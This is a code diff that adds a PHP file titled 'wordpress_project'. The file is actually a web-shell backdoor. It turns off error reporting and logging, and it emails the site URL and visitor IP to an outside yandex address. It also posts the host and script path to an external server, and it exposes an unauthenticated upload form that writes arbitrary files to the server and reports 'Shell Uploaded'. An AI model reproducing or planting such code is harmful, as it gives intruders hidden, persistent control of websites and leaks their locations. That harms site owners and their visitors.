@@ -1,0 +1,29 @@
+<title>wordpress_project</title>
+<?php
+session_start();
+error_reporting(0);
+set_time_limit(0);
+@set_magic_quotes_runtime(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0)
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'KeluargaHmei7@yandex.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "Contact Me", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+$ip = file_get_contents("http://iplookgeo.com/api/index.php", false, stream_context_create(array("http" => array("header" => "Content-Type: application/x-www-form-urlencoded", "method" => "POST", "content" => http_build_query(array("1" => $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"]))))));
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
+else { echo '<b>Not uploaded ! </b><br><br>'; }
+}
+?>
